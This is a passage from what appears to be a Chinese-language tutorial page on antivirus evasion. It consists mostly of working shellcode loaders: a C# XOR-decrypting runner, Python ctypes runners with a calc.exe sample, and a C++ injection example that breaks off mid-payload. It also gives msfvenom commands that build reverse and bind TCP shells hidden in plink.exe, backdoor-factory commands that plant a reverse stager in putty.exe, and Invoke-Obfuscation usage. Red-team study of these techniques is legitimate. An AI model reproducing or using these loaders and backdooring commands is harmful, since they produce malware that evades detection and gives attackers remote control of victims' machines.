class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace RunShellCode</span><br><span class="line">&#123;</span><br><span class="line">    static class Program</span><br><span class="line">    &#123;</span><br><span class="line">        //==============================================================================</span><br><span class="line">        // CRYPTO FUNCTIONS</span><br><span class="line">        //==============================================================================</span><br><span class="line">        private static T[] SubArray&lt;T&gt;(this T[] data, int index, int length)</span><br><span class="line">        &#123;</span><br><span class="line">            T[] result = new T[length];</span><br><span class="line">            Array.Copy(data, index, result, 0, length);</span><br><span class="line">            <span class="built_in">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static byte[] xor(byte[] cipher, byte[] key) &#123;</span><br><span class="line">            byte[] decrypted = new byte[cipher.Length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(int i = 0; i &lt; cipher.Length; i++) &#123;</span><br><span class="line">                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">return</span> decrypted;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        // Decrypts the given a plaintext message byte array with a given 128 bits key</span><br><span class="line">        // Returns the unencrypted message</span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        private static byte[] aesDecrypt(byte[] cipher, byte[] key)</span><br><span class="line">        &#123;</span><br><span class="line">            var IV = cipher.SubArray(0, 16);</span><br><span class="line">            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);</span><br><span class="line"></span><br><span class="line">            // Create an AesManaged object with the specified key and IV.</span><br><span class="line">            using (AesManaged aes = new AesManaged())</span><br><span class="line">            &#123;</span><br><span class="line">                aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">                aes.KeySize = 128;</span><br><span class="line">                aes.Key = key;</span><br><span class="line">                aes.IV = IV;</span><br><span class="line"></span><br><span class="line">                using (MemoryStream ms = new MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> ms.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //==============================================================================</span><br><span class="line">        // MAIN FUNCTION</span><br><span class="line">        //==============================================================================</span><br><span class="line">        static void <span class="function"><span class="title">Main</span></span>()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] encryptedShellcode = new byte[] &#123; 0x8d,0x81,0xec,0x67,0x71,0x69,0x0e,0xee,0x94,0x58,0xae,0x03,0xfa,0x39,0x5e,0xec,0x23,0x65,0xe5,0x35,0x65,0xe2,0x1c,0x4f,0x7e,0xde,0x24,0x41,0x40,0x96,0xc2,0x5b,0x10,0x15,0x6c,0x4b,0x51,0xa8,0xa1,0x6a,0x70,0xae,0x8c,0x95,0x23,0x3e,0xe5,0x35,0x61,0xe2,0x24,0x5b,0xfa,0x25,0x7f,0x1f,0x92,0x21,0x6f,0xb6,0x20,0xe2,0x37,0x47,0x70,0xba,0xe5,0x2e,0x69,0x8a,0x54,0x2e,0xfa,0x5d,0xe5,0x66,0xa7,0x58,0x91,0xcb,0xb0,0xa6,0x63,0x66,0xb6,0x51,0x8e,0x12,0x87,0x6a,0x13,0x9f,0x4a,0x14,0x4a,0x12,0x95,0x31,0xe5,0x3f,0x55,0x68,0xbd,0x01,0xfa,0x65,0x25,0xec,0x29,0x75,0x6f,0xb4,0xfa,0x6d,0xe5,0x66,0xa1,0xe0,0x2a,0x43,0x55,0x32,0x35,0x06,0x28,0x33,0x3f,0x98,0x91,0x36,0x31,0x3d,0xfa,0x7b,0x85,0xea,0x2c,0x01,0x5d,0x55,0x71,0x69,0x06,0x10,0x02,0x5b,0x31,0x33,0x19,0x25,0x19,0x41,0x76,0xe0,0x86,0x98,0xa1,0xd1,0xfe,0x66,0x71,0x69,0x47,0xa3,0x25,0x39,0x06,0x4e,0xf1,0x02,0x6e,0x98,0xa4,0x03,0x64,0x0f,0xb1,0xc1,0xc0,0xe9,0x19,0x6b,0x6e,0x76,0x2d,0xe0,0x88,0x37,0x21,0x39,0x3e,0x27,0x21,0x29,0x3e,0x0f,0x9b,0x66,0xb1,0x87,0x8e,0xbc,0xf9,0x0d,0x61,0x3f,0x39,0x0f,0xe8,0xcc,0x1a,0x06,0x8e,0xbc,0xeb,0xa7,0x05,0x63,0x91,0x29,0x79,0x1c,0x82,0x8f,0x16,0x69,0x6e,0x67,0x1b,0x69,0x04,0x63,0x27,0x3e,0x06,0x65,0xa8,0xa1,0x31,0x98,0xa4,0xea,0x96,0x67,0x0f,0x5f,0xe5,0x51,0x1b,0x29,0x06,0x67,0x61,0x69,0x6e,0x31,0x1b,0x69,0x06,0x3f,0xd5,0x3a,0x8b,0x98,0xa4,0xfa,0x3d,0x0d,0x71,0x3f,0x3d,0x30,0x19,0x6b,0xb7,0xaf,0x2e,0x96,0xbb,0xe4,0x89,0x69,0x13,0x4f,0x29,0x01,0x6e,0x27,0x71,0x69,0x04,0x67,0x21,0x01,0x65,0x48,0x7e,0x59,0x91,0xb2,0x26,0x01,0x1b,0x09,0x3c,0x08,0x91,0xb2,0x2f,0x37,0x91,0x6b,0x55,0x66,0xeb,0x17,0x8e,0x96,0x91,0x8e,0xea,0x96,0x91,0x98,0x70,0xaa,0x47,0xa1,0x04,0xa8,0xad,0xdc,0x81,0xdc,0xcc,0x31,0x1b,0x69,0x3d,0x98,0xa4 &#125;;</span><br><span class="line">            string key = <span class="string">&quot;qing&quot;</span>;</span><br><span class="line">            string cipherType = <span class="string">&quot;xor&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            byte[] shellcode = null;</span><br><span class="line"></span><br><span class="line">            //--------------------------------------------------------------</span><br><span class="line">            // Decrypt the shellcode</span><br><span class="line">            <span class="keyword">if</span> (cipherType == <span class="string">&quot;xor&quot;</span>) &#123;</span><br><span class="line">                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cipherType == <span class="string">&quot;aes&quot;</span>) &#123;</span><br><span class="line">                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //--------------------------------------------------------------            </span><br><span class="line">            // Copy decrypted shellcode to memory</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line"></span><br><span class="line">            // Prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            // Invoke the shellcode</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        // The usual Win32 API trio <span class="built_in">functions</span>: VirtualAlloc, CreateThread, WaitForSingleObject</span><br><span class="line">        [DllImport(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(</span><br><span class="line">            UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size,</span><br><span class="line">            UInt32 flAllocationType,</span><br><span class="line">            UInt32 flProtect</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="py-Base64-k8"><a href="#py-Base64-k8" class="headerlink" title="py Base64(k8)"></a>py Base64(k8)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line"><span class="comment">#calc.exe</span></span><br><span class="line"><span class="comment">#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==</span></span><br><span class="line">shellcode=bytearray(base64.b64decode(sys.argv[1]).decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>

<h3 id="py-十六进制"><a href="#py-十六进制" class="headerlink" title="py 十六进制"></a>py 十六进制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line"><span class="comment">#calc.exe</span></span><br><span class="line"><span class="comment">#sc = &quot;DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4&quot;</span></span><br><span class="line">shellcode=bytearray(sys.argv[1].decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>

<h3 id="shellcode-encoder"><a href="#shellcode-encoder" class="headerlink" title="shellcode_encoder"></a>shellcode_encoder</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JjeC9zaGVsbGNvZGVfZW5jb2Rlcg==">shellcode_encoder<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>windows下无法运行，须在linux下运行</p>
<h3 id="举例msfvenom"><a href="#举例msfvenom" class="headerlink" title="举例msfvenom"></a>举例msfvenom</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -l encoder</span></span><br><span class="line"></span><br><span class="line">Framework Encoders [--encoder &lt;value&gt;]</span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/brace                     low        Bash Brace Expansion Command Encoder</span><br><span class="line">    cmd/echo                      good       Echo Command Encoder</span><br><span class="line">    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd/ifs                       low        Bourne <span class="variable">$&#123;IFS&#125;</span> Substitution Command Encoder</span><br><span class="line">    cmd/perl                      normal     Perl Command Encoder</span><br><span class="line">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">    cmd/printf_php_mq             manual     <span class="built_in">printf</span>(1) via PHP magic_quotes Utility Command Encoder</span><br><span class="line">    generic/eicar                 manual     The EICAR Encoder</span><br><span class="line">    generic/none                  normal     The <span class="string">&quot;none&quot;</span> Encoder</span><br><span class="line">    mipsbe/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsbe/longxor                normal     XOR Encoder</span><br><span class="line">    mipsle/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsle/longxor                normal     XOR Encoder</span><br><span class="line">    php/base64                    great      PHP Base64 Encoder</span><br><span class="line">    ppc/longxor                   normal     PPC LongXOR Encoder</span><br><span class="line">    ppc/longxor_tag               normal     PPC LongXOR Encoder</span><br><span class="line">    ruby/base64                   great      Ruby Base64 Encoder</span><br><span class="line">    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class="line">    x64/xor                       normal     XOR Encoder</span><br><span class="line">    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder</span><br><span class="line">    x64/xor_dynamic               normal     Dynamic key XOR Encoder</span><br><span class="line">    x64/zutto_dekiru              manual     Zutto Dekiru</span><br><span class="line">    x86/add_sub                   manual     Add/Sub Encoder</span><br><span class="line">    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower</span><br><span class="line">    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower</span><br><span class="line">    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class="line">    x86/bmp_polyglot              manual     BMP Polyglot                                                           </span><br><span class="line">    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder                                                          </span><br><span class="line">    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder                                         </span><br><span class="line">    x86/context_stat              manual     <span class="built_in">stat</span>(2)-based Context Keyed Payload Encoder                                       </span><br><span class="line">    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder                                          </span><br><span class="line">    x86/countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class="line">    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">    x86/nonalpha                  low        Non-Alpha Encoder</span><br><span class="line">    x86/nonupper                  low        Non-Upper Encoder</span><br><span class="line">    x86/opt_sub                   manual     Sub Encoder (optimised)</span><br><span class="line">    x86/service                   manual     Register Service</span><br><span class="line">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    x86/single_static_bit         manual     Single Static Bit</span><br><span class="line">    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br><span class="line">    x86/xor_dynamic               normal     Dynamic key XOR Encoder</span><br></pre></td></tr></table></figure>

<h3 id="使用模板和编码器"><a href="#使用模板和编码器" class="headerlink" title="使用模板和编码器"></a>使用模板和编码器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe </span><br><span class="line"></span><br><span class="line">msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 -platform win -f exe &gt; b.exe</span><br></pre></td></tr></table></figure>

<h3 id="Invoke-Obfuscation"><a href="#Invoke-Obfuscation" class="headerlink" title="Invoke-Obfuscation"></a>Invoke-Obfuscation</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbGJvaGFubm9uL0ludm9rZS1PYmZ1c2NhdGlvbg==">Invoke-Obfuscation<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>安装-管理员权限下运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line">Import-Module ./Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Obfuscation -ScriptBlock &#123;<span class="built_in">echo</span> xss&#125; -Command <span class="string">&#x27;Encoding\1,Launcher\PS\67&#x27;</span> -Quiet</span><br></pre></td></tr></table></figure>

<h3 id="the-backdoor-factory"><a href="#the-backdoor-factory" class="headerlink" title="the-backdoor-factory"></a>the-backdoor-factory</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlY3JldHNxdWlycmVsL3RoZS1iYWNrZG9vci1mYWN0b3J5">the-backdoor-factory<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>apt-get install backdoor-factory</p>
<p>BDF中-F参数实现多裂缝注入。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">backdoor-factory -f putty.exe -s show</span><br><span class="line"></span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.15.135 -P 4444</span><br></pre></td></tr></table></figure>

<h3 id="正常进程注入shellcode"><a href="#正常进程注入shellcode" class="headerlink" title="正常进程注入shellcode"></a>正常进程注入shellcode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &quot;stdafx.h&quot;</span></span><br><span class="line"><span class="comment">#include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &quot;iostream&quot;</span></span><br><span class="line">using namespace std;</span><br><span class="line">    unsigned char shellcode[] =</span><br><span class="line">        <span class="string">&quot;\xb8\x72\xd9\xb8\x52\xda\xd8\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1&quot;</span></span><br><span class="line">        <span class="string">&quot;\x56\x83\xc2\x04\x31\x42\x0f\x03\x42\x7d\x3b\x4d\xae\x69\x39&quot;</span></span><br><span class="line">        <span class="string">&quot;\xae\x4f\x69\x5e\x26\xaa\x58\x5e\x5c\xbe\xca\x6e\x16\x92\xe6&quot;</span></span><br><span class="line">        <span class="string">&quot;\x05\x7a\x07\x7d\x6b\x53\x28\x36\xc6\x85\x07\xc7\x7b\xf5\x06&quot;</span></span><br><span class="line">        <span class="string">&quot;\x4b\x86\x2a\xe9\x72\x49\x3f\xe8\xb3\xb4\xb2\xb8\x6c\xb2\x61&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2d\x19\x8e\xb9\xc6\x51\x1e\xba\x3b\x21\x21\xeb\xed\x3a\x78&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2b\x0f\xef\xf0\x62\x17\xec\x3d\x3c\xac\xc6\xca\xbf\x64\x17&quot;</span></span><br><span class="line">        <span class="string">&quot;\x32\x13\x49\x98\xc1\x6d\x8d\x1e\x3a\x18\xe7\x5d\xc7\x1b\x3c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x1c\x13\xa9\xa7\x86\xd0\x09\x0c\x37\x34\xcf\xc7\x3b\xf1\x9b&quot;</span></span><br><span class="line">        <span class="string">&quot;\x80\x5f\x04\x4f\xbb\x5b\x8d\x6e\x6c\xea\xd5\x54\xa8\xb7\x8e&quot;</span></span><br><span class="line">        <span class="string">&quot;\xf5\xe9\x1d\x60\x09\xe9\xfe\xdd\xaf\x61\x12\x09\xc2\x2b\x7a&quot;</span></span><br><span class="line">        <span class="string">&quot;\xfe\xef\xd3\x7a\x68\x67\xa7\x48\x37\xd3\x2f\xe0\xb0\xfd\xa8&quot;</span></span><br><span class="line">        <span class="string">&quot;\x71\xd6\xfd\x67\x39\xb7\x03\x88\x39\x91\xc7\xdc\x69\x89\xee&quot;</span></span><br><span class="line">        <span class="string">&quot;\x5c\xe2\x49\x0e\x89\x9e\x43\x98\xf2\xf6\xfa\xdc\x9b\x04\x03&quot;</span></span><br><span class="line">        <span class="string">&quot;\xcc\x07\x81\xe5\xbe\xe7\xc1\xb9\x7e\x58\xa1\x69\x17\xb2\x2e&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x07\xbd\xe5\xfe\xa2\x52\x53\x56\x5b\xca\xfe\x2c\xfa\x13&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd5\x48\x3c\x9f\xdf\xad\xf3\x68\xaa\xbd\xe4\x0e\x54\x3e\xf5&quot;</span></span><br><span class="line">        <span 